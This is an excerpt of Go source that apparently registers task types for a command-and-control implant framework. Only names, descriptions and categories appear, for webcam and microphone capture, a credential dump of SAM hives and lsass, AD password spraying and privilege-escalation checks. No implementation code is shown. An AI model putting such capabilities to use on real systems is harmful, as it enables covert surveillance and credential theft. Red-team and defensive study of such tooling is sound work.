...
func init() {
	registeredTaskTypes = []TaskTypeInfo{
		...
		{Type: protocol.TaskTypeProcessTree, Name: "Process List (ps alias)", Description: "Process list (alias of ps; not a true parent-child tree view)", Category: "discovery"},
		...
		{Type: "webcam", Name: "Webcam Capture", Description: "Capture a still frame from the default webcam", Category: "collection",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: false, Description: "Optional capture params (seconds or device hint)"}}},
		{Type: "mic", Name: "Microphone Capture", Description: "Record audio from the default microphone", Category: "collection",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: false, Description: "Duration in seconds (default 5)"}}},
		...
		{Type: protocol.TaskTypeCreds, Name: "Dump Credentials (scripted)", Description: "Scripted: save SAM/SYSTEM/SECURITY hives and an lsass minidump to disk — not an in-memory parse", Category: "credential-access"},
		...
		{Type: protocol.TaskTypePasswordSpray, Name: "Password Spray", Description: "Try a password against multiple AD accounts with lockout awareness", Category: "credential-access",
			Parameters: []TaskTypeParam{
		...
		{Type: protocol.TaskTypePrivescCheck, Name: "PrivEsc Check", Description: "Recon check for escalation vectors — not a guaranteed elevation", Category: "privilege-escalation"},
